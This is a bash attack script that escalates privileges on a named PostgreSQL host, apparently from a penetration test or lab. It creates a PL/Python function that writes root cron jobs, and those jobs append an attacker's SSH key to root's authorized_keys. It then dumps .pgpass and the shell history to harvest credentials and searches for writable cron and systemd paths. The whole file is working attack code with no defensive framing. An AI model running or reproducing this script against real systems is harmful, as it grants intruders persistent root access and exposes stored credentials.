#!/bin/bash
# Auto privesc for migration-db-los (10.9.100.145)
# Run as postgres user
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDpWL0G0DW8jr5waNkU8pbyI3u+p7Uk7bNfehfIk15yj kali@kali"
echo "[*] Starting privesc enumeration..."

# Check PL extensions
echo "[*] Checking PL extensions..."
psql -U postgres -tAc "SELECT name,installed_version FROM pg_available_extensions WHERE name LIKE '%python%' OR name LIKE '%perl%' OR name LIKE '%tcl%';" 2>&1

# Try creating plpython3u extension and executing as postgres
echo "[*] Trying PL/Python3U..."
psql -U postgres -c "CREATE EXTENSION IF NOT EXISTS plpython3u;" 2>&1
if [ $? -eq 0 ]; then
    echo "[+] plpython3u created! Attempting root via Python..."
    # PL/Python runs as postgres OS user, but we can try to find writable places
    psql -U postgres -c "
    CREATE OR REPLACE FUNCTION exec_root() RETURNS text AS \$\$
    import subprocess, os
    # Check if we can write crontab for root via crontab file
    try:
        with open('/var/spool/cron/crontabs/root', 'w') as f:
            f.write('* * * * * /bin/bash -c \"mkdir -p /root/.ssh; echo $KEY >> /root/.ssh/authorized_keys; chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys\"\n')
        return 'CRONTAB_WRITTEN'
    except:
        pass
    # Try writing to cron.d
    try:
        with open('/etc/cron.d/pg_maint', 'w') as f:
            f.write('* * * * * root /bin/bash -c \"mkdir -p /root/.ssh; echo $KEY >> /root/.ssh/authorized_keys; chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys\"\n')
        return 'CROND_WRITTEN'
    except:
        pass
    return 'WRITE_FAILED'
    \$\$ LANGUAGE plpython3u;
    SELECT exec_root();
    " 2>&1
fi

# Check PostgreSQL data directory permissions
echo "[*] Checking PG data dir..."
ls -la /var/lib/postgresql/14/main/
ls -la /etc/postgresql/

# Check for password reuse
echo "[*] Checking password files..."
cat /var/lib/postgresql/.pgpass 2>&1
cat /var/lib/postgresql/.bash_history 2>&1

# Check for writable paths in system
echo "[*] Checking writable system paths..."
find /etc/cron* -writable 2>/dev/null
find /etc/systemd -writable 2>/dev/null
find /usr/lib/systemd -writable 2>/dev/null

echo "[*] Done"
